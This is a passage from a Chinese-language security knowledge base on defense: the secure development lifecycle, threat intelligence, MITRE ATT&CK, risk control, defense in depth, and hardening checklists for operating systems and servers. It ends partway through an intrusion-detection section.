<h3>安全开发<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>安全开发生命周期（Security Development Lifecycle，SDL）是微软提出的从安全的角度来指导软件开发过程的管理模式。用于帮助开发人员构建更安全的软件、解决安全合规要求，并降低开发成本。</p>
</div>
<div class="section" id="id3">
<h4>步骤<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<div class="section" id="id4">
<h5>阶段1：培训<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>开发团队的所有成员都必须接受适当的安全培训，了解相关的安全知识。培训对象包括开发人员、测试人员、项目经理、产品经理等。</p>
</div>
<div class="section" id="id5">
<h5>阶段2：确定安全需求<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>在项目确立之前，需要提前确定安全方面的需求，确定项目的计划时间，尽可能避免安全引起的需求变更。</p>
</div>
<div class="section" id="id6">
<h5>阶段3：设计<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>在设计阶段确定安全的最低可接受级别。考虑项目涉及到哪些攻击面、是否能减小攻击面。</p>
<p>对项目进行威胁建模，明确可能来自的攻击有哪些方面，并考虑项目哪些部分需要进行渗透测试。</p>
</div>
<div class="section" id="id7">
<h5>阶段4：实现<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<p>实现阶段主要涉及到工具、不安全的函数、静态分析等方面。</p>
<p>工具方面主要考虑到开发团队使用的编辑器、链接器等相关工具可能会涉及一些安全相关的问题，因此在使用工具的版本上，需要提前与安全团队进行沟通。</p>
<p>函数方面主要考虑到许多常用函数可能存在安全隐患，应当禁用不安全的函数和API，使用安全团队推荐的函数。</p>
<p>代码静态分析可以由相关工具辅助完成，其结果与人工分析相结合。</p>
</div>
<div class="section" id="id8">
<h5>阶段5：验证<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<p>验证阶段涉及到动态程序分析和攻击面再审计。动态分析对静态分析进行补充，常用的方式是模糊测试、渗透测试。模糊测试通过向应用程序引入特定格式或随机数据查找程序可能的问题。</p>
<p>考虑到项目经常会因为需求变更等情况使得最终产品和初期目标不一致，因此需要在项目后期再次对威胁模型和攻击面进行分析和考虑，如果出现问题则进行纠正。</p>
</div>
<div class="section" id="id9">
<h5>阶段6：发布<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<p>在程序发布后，需要对安全事件进行响应，需要预设好遇到安全问题时的处理方式。</p>
<p>另外如果产品中包含第三方的代码，也需要考虑如何响应因为第三方依赖引入的问题。</p>
</div>
</div>
<div class="section" id="id10">
<h4>参考链接<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.microsoft.com/en-us/securityengineering/sdl/practices">SDL Practices</a></li>
<li><a class="reference external" href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling">Threat Modeling</a></li>
</ul>
</div>
</div>
<span id="document-defense/secops"></span><div class="section" id="id1">
<h3>安全建设<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>参考链接<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
</div>
<div class="section" id="id3">
<h4>安全运营<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://zhuanlan.zhihu.com/p/39467201">我理解的安全运营 by 职业欠钱</a></li>
<li><a class="reference external" href="https://zhuanlan.zhihu.com/p/84591095">再谈安全运营 by 职业欠钱</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s?__biz=MzIzMTAzNzUxMQ==&amp;mid=2652893616&amp;idx=1&amp;sn=6738a4e33050ed084d1535196aec6061">我们谈安全运营时在谈什么 by 聂君</a></li>
<li><a class="reference external" href="https://36kr.com/p/1721236635649">金融行业企业安全运营之路 by 聂君</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s?__biz=MzI2MjQ1NTA4MA==&amp;mid=2247485062&amp;idx=1&amp;sn=94c9fa40edef6de0ea46c453405e3687">秦波：大型互联网应用安全SDL体系建设实践</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s?__biz=MzI2MjQ1NTA4MA==&amp;mid=2247485405&amp;idx=1&amp;sn=bda9283329f6db15d69d4cdf37c609d2">谭晓生：论CISO的个人修养</a></li>
<li><a class="reference external" href="https://www.freebuf.com/articles/es/200024.html">赵彦的CISO闪电战 两年甲方安全修炼之路</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s?__biz=MzI2MjQ1NTA4MA==&amp;mid=2247484735&amp;idx=1&amp;sn=02e06dd84ee0322dd2f9fe761b244013">胡珀谈安全运营 by lake2</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s/rc6X5SlsoRp6s7RCEZ67mA">小步快跑，快速迭代：安全运营的器术法道</a></li>
</ul>
<div class="section" id="id9">
<h5>资产管理<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://mp.weixin.qq.com/s?__biz=MzA5MDY3MzMyOQ==&amp;mid=2649439751&amp;idx=1&amp;sn=18ac49aff75ee4b1433e429df56ba44b">资产管理的难点</a></li>
</ul>
</div>
</div>
</div>
<span id="document-defense/threat"></span><div class="section" id="id1">
<h3>威胁情报<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<div class="section" id="id3">
<h5>产生原因<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>新一代的攻击者常常向企业和组织发起针对性的网络攻击，这种针对性强的攻击，一般经过了精心的策划，攻击方法、途径复杂，后果严重。在面对这种攻击时，攻防存在着严重的不对等，为了尽可能消除这种不对等，威胁情报 (Threat Intelligence) 应运而生。</p>
</div>
<div class="section" id="id4">
<h5>定义<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>威胁情报(Threat Intelligence)，也被称作安全情报(Security Intelligence)、安全威胁情报(Security Threat Intelligence)。</p>
<p>关于威胁情报的定义有很多，一般是指从安全数据中提炼的，与网络空间威胁相关的信息，包括威胁来源、攻击意图、攻击手法、攻击目标信息，以及可用于解决威胁或应对危害的知识。广义的威胁情报也包括情报的加工生产、分析应用及协同共享机制。相关的概念有资产、威胁、脆弱性等，具体定义如下。</p>
<p>一般威胁情报需要包含威胁源、攻击目的、攻击对象、攻击手法、漏洞、攻击特征、防御措施等。威胁情报在事前可以起到预警的作用，在威胁发生时可以协助进行检测和响应，在事后可以用于分析和溯源。</p>
<p>常见的网络威胁情报服务有黑客或欺诈团体分析、社会媒体和开源信息监控、定向漏洞研究、定制的人工分析、实时事件通知、凭据恢复、事故调查、伪造域名检测等。</p>
<p>在威胁情报方面，比较有代表性的厂商有BAE Systems Applied Intelligence、Booz Allen、RSA、IBM、McAfee、赛门铁克、FireEye等。</p>
</div>
</div>
<div class="section" id="id5">
<h4>相关概念<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<div class="section" id="asset">
<h5>资产(Asset)<a class="headerlink" href="#asset" title="永久链接至标题">¶</a></h5>
<p>对组织具有价值的信息或资源，属于内部情报，通过资产测绘等方式发现。</p>
</div>
<div class="section" id="threat">
<h5>威胁(Threat)<a class="headerlink" href="#threat" title="永久链接至标题">¶</a></h5>
<p>能够通过未授权访问、毁坏、揭露、数据修改和或拒绝服务对系统造成潜在危害的起因，威胁可由威胁的主体(威胁源)、能力、资源、动机、途径、可能性和后果等多种属性来刻画</p>
</div>
<div class="section" id="vulnerability">
<h5>脆弱性 / 漏洞(Vulnerability)<a class="headerlink" href="#vulnerability" title="永久链接至标题">¶</a></h5>
<p>可能被威胁如攻击者利用的资产或若干资产薄弱环节。</p>
<p>漏洞存在多个周期，最开始由安全研究员或者攻击者发现，而后出现在社区公告/官方邮件/博客中。随着信息的不断地传递，漏洞情报出现在开源社区等地方，并带有PoC和漏洞细节分析。再之后出现自动化工具开始大规模传播，部分漏洞会造成社会影响并被媒体报道，最后漏洞基本修复。</p>
</div>
<div class="section" id="risk">
<h5>风险(Risk)<a class="headerlink" href="#risk" title="永久链接至标题">¶</a></h5>
<p>威胁利用资产或一组资产的脆弱性对组织机构造成伤害的潜在可能。</p>
</div>
<div class="section" id="event">
<h5>安全事件(Event)<a class="headerlink" href="#event" title="永久链接至标题">¶</a></h5>
<p>威胁利用资产的脆弱性后实际产生危害的情景。</p>
</div>
</div>
<div class="section" id="id6">
<h4>情报来源<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<p>为了实现情报的同步和交换，各组织都制定了相应的标准和规范。主要有国标，美国联邦政府标准等。</p>
<p>除了国家外，企业也有各自的情报来源，例如厂商、CERT、开发者社区、安全媒体、漏洞作者或团队、公众号、个人博客、代码仓库等。</p>
</div>
<div class="section" id="id7">
<h4>威胁框架<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<p>比较有影响力的威胁框架主要有洛克希德-马丁的杀伤链框架(Cyber Kill Chain Framework)、MITRE的ATT&amp;CK框架(Common Knowledge base of Adversary Tactics and Techniques)、ODNI的CCTF框架(Common Cyber Threat Framework，公共网空威胁框架)，以及NSA的TCTF框架(Technical Cyber Threat Framework，技术性网空威胁框架)。</p>
</div>
<div class="section" id="id8">
<h4>参考链接<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://scadahacker.com/library/Documents/Threat_Intelligence/iSight%20Partners%20-%20Executive%20Perspectives%20on%20Cyber%20Threat%20Intelligence.pdf">Executive Perspectives on Cyber Threat Intelligence</a></li>
<li><a class="reference external" href="https://www.darkreading.com/analytics/threat-intelligence/cyber-threats-information-vs-intelligence/a/d-id/1316851">Cyber Threats: Information vs. Intelligence</a></li>
<li><a class="reference external" href="https://www.freebuf.com/column/136763.html">威胁情报简介及市场浅析</a></li>
</ul>
</div>
</div>
<span id="document-defense/att8ck"></span><div class="section" id="att-ck">
<h3>​​ATT&amp;CK<a class="headerlink" href="#att-ck" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>MITRE是美国政府资助的一家研究机构，该公司于1958年从MIT分离出来，并参与了许多商业和最高机密项目。其中包括开发FAA空中交通管制系统和AWACS机载雷达系统。MITRE在美国国家标准技术研究所(NIST)的资助下从事了大量的网络安全实践。</p>
<p>MITRE在2013年推出了ATT&amp;CK™ 模型，它的全称是 Adversarial Tactics, Techniques, and Common Knowledge (ATT&amp;CK)，它是一个站在攻击者的视角来描述攻击中各阶段用到的技术的模型。将已知攻击者行为转换为结构化列表，将这些已知的行为汇总成战术和技术，并通过几个矩阵以及结构化威胁信息表达式(STIX)、指标信息的可信自动化交换(TAXII)来表示。由于此列表相当全面地呈现了攻击者在攻击网络时所采用的行为，因此对于各种进攻性和防御性度量、表示和其他机制都非常有用。多用于模拟攻击、评估和提高防御能力、威胁情报提取和建模、威胁评估和分析。</p>
<p>官方对 ATT&amp;CK的描述是：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>MITRE’s Adversarial Tactics, Techniques, and Common Knowledge (ATT&amp;CK) is a curated knowledge base and model for cyber adversary behavior, reflecting the various phases of an adversary’s attack lifecycle and the platforms they are known to target.
</pre></div>
</div>
<p>和Kill Chain等模型相比，ATT&amp;CK的抽象程度会低一些，但是又比普通的利用和漏洞数据库更高。MITRE公司认为，Kill Chain在高维度理解攻击过程有帮助，但是无法有效描述对手在单个漏洞的行为。</p>
<p>目前ATT&amp;CK模型分为三部分，分别是PRE-ATT&amp;CK，ATT&amp;CK for Enterprise(包括Linux、macOS、Windows)和ATT&amp;CK for Mobile(包括iOS、Android)，其中PRE-ATT&amp;CK覆盖攻击链模型的前两个阶段(侦察跟踪、武器构建)，ATT&amp;CK for Enterprise覆盖攻击链的后五个阶段(载荷传递、漏洞利用、安装植入、命令与控制、目标达成)，ATT&amp;CK Matrix for Mobile主要针对移动平台。</p>
<p>PRE-ATT&amp;CK包括的战术有优先级定义、选择目标、信息收集、发现脆弱点、攻击性利用开发平台、建立和维护基础设施、人员的开发、建立能力、测试能力、分段能力。</p>
<p>ATT&amp;CK for Enterprise包括的战术有访问初始化、执行、常驻、提权、防御规避、访问凭证、发现、横向移动、收集、数据获取、命令和控制。</p>
</div>
<div class="section" id="ttp">
<h4>TTP<a class="headerlink" href="#ttp" title="永久链接至标题">¶</a></h4>
<p>MITRE在定义ATT&amp;CK时，定义了一些关键对象：组织 (Groups)、软件 (Software)、技术 (Techniques)、战术 (Tactics)。</p>
<p>其中组织使用战术和软件，软件实现技术，技术实现战术。例如APT28(组织)使用Mimikatz(软件)达到了获得登录凭证的效果(技术)实现了以用户权限登录的目的(战术)。整个攻击行为又被称为TTP，是战术、技术、过程的集合。</p>
</div>
<div class="section" id="id2">
<h4>参考链接<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://attack.mitre.org/">Mitre ATT&amp;CK</a></li>
<li><a class="reference external" href="https://github.com/mitre/advmlthreatmatrix">Adversarial Threat Matrix</a></li>
<li><a class="reference external" href="https://www.mitre.org/sites/default/files/publications/pr-18-0944-11-mitre-attack-design-and-philosophy.pdf">MITRE ATT&amp;CK：Design and Philosophy</a></li>
<li><a class="reference external" href="https://bbs.pediy.com/thread-254825.htm">ATT&amp;CK一般性学习笔记</a></li>
<li><a class="reference external" href="https://github.com/mitre/cti">Cyber Threat Intelligence Repository expressed in STIX 2.0</a></li>
<li><a class="reference external" href="https://github.com/Neo23x0/sigma">sigma</a> Generic Signature Format for SIEM Systems</li>
<li><a class="reference external" href="https://github.com/mitre/caldera">caldera</a>  Automated Adversary Emulation</li>
<li><a class="reference external" href="https://github.com/endgameinc/RTA">RTA</a> Red Team Automation</li>
</ul>
</div>
</div>
<span id="document-defense/riskcontrol"></span><div class="section" id="id1">
<h3>风险控制<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>常见风险<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>会员</dt>
<dd><ul class="first last">
<li>撞库盗号</li>
<li>账号分享</li>
<li>批量注册</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>视频</dt>
<dd><ul class="first last">
<li>盗播盗看</li>
<li>广告屏蔽</li>
<li>刷量作弊</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>活动</dt>
<dd><ul class="first last">
<li>恶意刷</li>
<li>薅羊毛</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>直播</dt>
<dd><ul class="first last">
<li>挂站人气</li>
<li>恶意图文</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>电商</dt>
<dd><ul class="first last">
<li>恶意下单</li>
<li>订单欺诈</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>支付</dt>
<dd><ul class="first last">
<li>盗号盗卡</li>
<li>洗钱</li>
<li>恶意下单</li>
<li>恶意提现</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>其他</dt>
<dd><ul class="first last">
<li>钓鱼邮件</li>
<li>恶意爆破</li>
<li>短信轰炸</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id3">
<h4>防御策略<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>核身策略</dt>
<dd><ul class="first last">
<li>同一收货手机号</li>
<li>同一收货地址</li>
<li>同一历史行为</li>
<li>同一IP</li>
<li>同一设备</li>
<li>同一支付ID</li>
<li>LBS</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id4">
<h4>异常特征<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><dl class="first docutils">
<dt>APP用户异常特征</dt>
<dd><ul class="first last">
<li>IP</li>
<li>设备为特定型号</li>
<li>本地APP列表中有沙盒APP</li>
<li>Root用户</li>
<li>同设备登录过多个账号</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id5">
<h4>参考链接<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="http://doc.cocolian.cn/essay/risk/2016/12/18/risk-2-database/">支付风控模型和流程分析</a></li>
<li><a class="reference external" href="https://mp.weixin.qq.com/s?__biz=MzI0MjczMjM2NA==&amp;mid=2247483836&amp;idx=1&amp;sn=d46875c957289d8e035345992ad7053e">爱奇艺业务安全风控体系的建设实践</a></li>
</ul>
</div>
</div>
<span id="document-defense/framework"></span><div class="section" id="id1">
<h3>防御框架<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>防御纵深<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>根据纵深，防御可以分为物理层、数据层、终端层、系统层、网络层、应用层几层。这几层纵深存在层层递进相互依赖的关系。</p>
<div class="section" id="id3">
<h5>物理层<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>物理层实际应用中接触较少，但仍是非常重要的位置。如果物理层设计不当，很容易被攻击者通过物理手段绕过上层防御。</p>
</div>
<div class="section" id="id4">
<h5>数据层<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>数据处于防御纵深较底层的位置，攻击的目标往往也是为了拿到数据，很多防御也是围绕数据不被破坏、窃取等展开的。</p>
</div>
<div class="section" id="id5">
<h5>终端层<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>终端包括PC、手机、IoT以及其他的智能设备，连入网络的终端是否可信是需要解决的问题。</p>
</div>
<div class="section" id="id6">
<h5>系统层<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>操作系统运行在终端上，可能会存在提权、非授权访问等问题。</p>
</div>
<div class="section" id="id7">
<h5>网络层<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<p>网络层使用通信线路将多台计算机相互连接起来，依照商定的协议进行通信。网络层存在MITM、DDoS等攻击。</p>
</div>
<div class="section" id="id8">
<h5>应用层<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<p>应用层是最上层，主要涉及到Web应用程序的各种攻击。</p>
</div>
</div>
<div class="section" id="id9">
<h4>访问控制<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h4>
<p>Web应用需要限制用户对应用程序的数据和功能的访问，以防止用户未经授权访问。访问控制的过程可以分为验证、会话管理和访问控制三个地方。</p>
<div class="section" id="id10">
<h5>验证机制<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<p>验证机制在一个应用程序的用户访问处理中是一个最基本的部分，验证就是确定该用户的有效性。大多数的web应用都采用使用的验证模型，即用户提交一个用户名和密码，应用检查它的有效性。在银行等安全性很重要的应用程序中，基本的验证模型通常需要增加额外的证书和多级登录过程，比如客户端证书、硬件等。</p>
</div>
<div class="section" id="id11">
<h5>会话管理<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<p>为了实施有效的访问控制，应用程序需要一个方法来识别和处理这一系列来自每个不同用户的请求。大部分程序会为每个会话创建一个唯一性的token来识别。</p>
<p>对攻击者来说，会话管理机制高度地依赖于token的安全性。在部分情况下，一个攻击者可以伪装成受害的授权用户来使用Web应用程序。这种情况可能有几种原因，其一是token生成的算法的缺陷，使得攻击者能够猜测到其他用户的token；其二是token后续处理的方法的缺陷，使得攻击者能够获得其他用户的token。</p>
</div>
<div class="section" id="id12">
<h5>访问控制<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h5>
<p>处理用户访问的最后一步是正确决定对于每个独立的请求是允许还是拒绝。如果前面的机制都工作正常，那么应用程序就知道每个被接受到的请求所来自的用户的id，并据此决定用户对所请求要执行的动作或要访问的数据是否得到了授权。</p>
<p>由于访问控制本身的复杂性，这使得它成为攻击者的常用目标。开发者经常对用户会如何与应用程序交互作出有缺陷的假设，也经常省略了对某些应用程序功能的访问控制检查。</p>
</div>
</div>
<div class="section" id="id13">
<h4>输入处理<a class="headerlink" href="#id13" title="永久链接至标题">¶</a></h4>
<p>很多对Web应用的攻击都涉及到提交未预期的输入，它导致了该应用程序设计者没有料到的行为。因此，对于应用程序安全性防护的一个关键的要求是它必须以一个安全的方式处理用户的输入。</p>
<p>基于输入的漏洞可能出现在一个应用程序的功能的任何地方，并与其使用的技术类型相关。对于这种攻击，输入验证是常用的必要防护。常用的防护机制有如下几种：黑名单、白名单、过滤、处理。</p>
<div class="section" id="id14">
<h5>黑名单<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h5>
<p>黑名单包含已知的被用在攻击方面的一套字面上的字符串或模式，验证机制阻挡任何匹配黑名单的数据。</p>
<p>一般来说，这种方式是被认为是输入效果较差的一种方式。主要有两个原因，其一Web应用中的一个典型的漏洞可以使用很多种不同的输入来被利用，输入可以是被加密的或以各种不同的方法表示。</p>
<p>其二，漏洞利用的技术是在不断地改进的，有关利用已存在的漏洞类型的新的方法不可能被当前黑名单阻挡。</p>
</div>
<div class="section" id="id15">
<h5>白名单<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h5>
<p>白名单包含一系列的字符串、模式或一套标准来匹配符合要求的输入。这种检查机制允许匹配白名单的数据，阻止之外的任何数据。这种方式相对比较有效，但需要比较好的设计。</p>
</div>
<div class="section" id="id16">
<h5>过滤<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h5>
<p>过滤会删除潜在的恶意字符并留下安全的字符，基于数据过滤的方式通常是有效的，并且在许多情形中，可作为处理恶意输入的通用解决方案。</p>
</div>
<div class="section" id="id17">
<h5>安全地处理数据<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h5>
<p>非常多的web应用程序漏洞的出现是因为用户提供的数据是以不安全的方法被处理的。在一些情况下，存在安全的编程方法能够避免通常的问题。例如，SQL注入攻击能够通过预编译的方式组织，XSS在大部分情况下能够被转义所防御。</p>
</div>
</div>
</div>
<span id="document-defense/reinforce"></span><div class="section" id="id1">
<h3>加固检查<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>网络设备<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>及时检查系统版本号</li>
<li>敏感服务设置访问IP/MAC白名单</li>
<li>开启权限分级控制</li>
<li>关闭不必要的服务</li>
<li>打开操作日志</li>
<li>配置异常告警</li>
<li>关闭ICMP回应</li>
</ul>
</div>
<div class="section" id="id3">
<h4>操作系统<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<div class="section" id="linux">
<h5>Linux<a class="headerlink" href="#linux" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>无用用户/用户组检查</li>
<li>空口令帐号检查</li>
<li><dl class="first docutils">
<dt>用户密码策略</dt>
<dd><ul class="first last">
<li>/etc/login.defs</li>
<li>/etc/pam.d/system-auth</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>敏感文件权限配置</dt>
<dd><ul class="first last">
<li>/etc/passwd</li>
<li>/etc/shadow</li>
<li>~/.ssh/</li>
<li>/var/log/messages</li>
<li>/var/log/secure</li>
<li>/var/log/maillog</li>
<li>/var/log/cron</li>
<li>/var/log/spooler</li>
<li>/var/log/boot.log</li>
</ul>
</dd>
</dl>
</li>
<li>日志是否打开</li>
<li>及时安装补丁</li>
<li><dl class="first docutils">
<dt>开机自启</dt>
<dd><ul class="first last">
<li>/etc/init.d</li>
</ul>
</dd>
</dl>
</li>
<li>检查系统时钟</li>
</ul>
</div>
<div class="section" id="windows">
<h5>Windows<a class="headerlink" href="#windows" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>异常进程监控</li>
<li>异常启动项监控</li>
<li>异常服务监控</li>
<li>配置系统日志</li>
<li><dl class="first docutils">
<dt>用户账户</dt>
<dd><ul class="first last">
<li>设置口令有效期</li>
<li>设置口令强度限制</li>
<li>设置口令重试次数</li>
</ul>
</dd>
</dl>
</li>
<li>安装EMET</li>
<li>启用PowerShell日志</li>
<li><dl class="first docutils">
<dt>限制以下敏感文件的下载和执行</dt>
<dd><ul class="first last">
<li>ade, adp, ani, bas, bat, chm, cmd, com, cpl, crt, hlp, ht, hta, inf, ins, isp, job, js, jse, lnk, mda, mdb, mde, mdz, msc, msi, msp, mst, pcd, pif, reg, scr, sct, shs, url, vb, vbe, vbs, wsc, wsf, wsh, exe, pif</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>限制会调起wscript的后缀</dt>
<dd><ul class="first last">
<li>bat, js, jse, vbe, vbs, wsf, wsh</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>域</dt>
<dd><ul class="first last">
<li>限制将计算机加入域的权限</li>
<li>域账户使用最小权限原则</li>
<li>减少非必要高权限账户的数量</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
</div>
<div class="section" id="id4">
<h4>应用<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<div class="section" id="ftp">
<h5>FTP<a class="headerlink" href="#ftp" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>禁止匿名登录</li>
<li>修改Banner</li>
</ul>
</div>
<div class="section" id="ssh">
<h5>SSH<a class="headerlink" href="#ssh" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>是否禁用ROOT登录</li>
<li>是否禁用密码连接</li>
</ul>
</div>
<div class="section" id="mysql">
<h5>MySQL<a class="headerlink" href="#mysql" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>文件写权限设置</li>
<li>用户授权表管理</li>
<li>日志是否启用</li>
<li>版本是否最新</li>
</ul>
</div>
</div>
<div class="section" id="web">
<h4>Web中间件<a class="headerlink" href="#web" title="永久链接至标题">¶</a></h4>
<div class="section" id="apache">
<h5>Apache<a class="headerlink" href="#apache" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>版本号隐藏</li>
<li>版本是否最新</li>
<li>禁用部分HTTP动词</li>
<li>关闭Trace</li>
<li>禁止 <code class="docutils literal notranslate"><span class="pre">server-status</span></code></li>
<li>上传文件大小限制</li>
<li>目录权限设置</li>
<li>是否允许路由重写</li>
<li>是否允许列目录</li>
<li>日志配置</li>
<li>配置超时时间防DoS</li>
<li><dl class="first docutils">
<dt>非属主用户文件读写限制</dt>
<dd><ul class="first last">
<li>httpd.conf</li>
<li>access.log</li>
<li>error.log</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="nginx">
<h5>Nginx<a class="headerlink" href="#nginx" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>禁用部分HTTP动词</li>
<li>禁用目录遍历</li>
<li>检查重定向配置</li>
<li>配置超时时间防DoS</li>
</ul>
</div>
<div class="section" id="iis">
<h5>IIS<a class="headerlink" href="#iis" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>版本是否最新</li>
<li>日志配置</li>
<li>用户口令配置</li>
<li>ASP.NET功能配置</li>
<li>配置超时时间防DoS</li>
</ul>
</div>
<div class="section" id="jboss">
<h5>JBoss<a class="headerlink" href="#jboss" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>jmx console配置</li>
<li>web console配置</li>
</ul>
</div>
<div class="section" id="tomcat">
<h5>Tomcat<a class="headerlink" href="#tomcat" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>禁用部分HTTP动词</li>
<li>禁止列目录</li>
<li>禁止manager功能</li>
<li>用户密码配置</li>
<li>用户权限配置</li>
<li>配置超时时间防DoS</li>
</ul>
</div>
</div>
<div class="section" id="id5">
<h4>密码管理策略<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>长度不少于8个字符</li>
<li>不存在于已有字典之中</li>
<li>不使用基于知识的认证方式</li>
</ul>
</div>
<div class="section" id="id6">
<h4>参考链接<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://github.com/PaulSec/awesome-windows-domain-hardening">awesome windows domain hardening</a></li>
<li><a class="reference external" href="https://docs.microsoft.com/zh-cn/windows/security/threat-protection/microsoft-defender-atp/customize-attack-surface-reduction">customize attack surface reduction</a></li>
</ul>
</div>
</div>
<span id="document-defense/intrusiondetection"></span><div class="section" id="id1">
<h3>入侵检测<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="idsips">
<h4>IDS与IPS<a class="headerlink" href="#idsips" title="永久链接至标题">¶</a></h4>
<p>IDS与IPS是常见的防护设备，IPS相对IDS的不同点在于，IPS通常具有阻断能力。</p>
</div>
<div class="section" id="id2">
<h4>常见入侵点<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>Web入侵</li>
<li>高危服务入侵</li>
</ul>
</div>
<div class="section" id="id3">
<h4>监控实现<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<div class="section" id="id4">
<h5>客户端监控<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>监控敏感配置文件</li>
<li><dl class="first docutils">
<dt>常用命令ELF文件完整性监控</dt>
<dd><ul class="first last">
<li><code class="docutils literal notranslate"><span class="pre">ps</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">lsof</span></code></li>
<li>...</li>
</ul>
</dd>
</dl>
</li>
<li>rootkit监控</li>
<li><dl class="first docutils">
<dt>资源使用报警</dt>
<dd><ul class="first last">
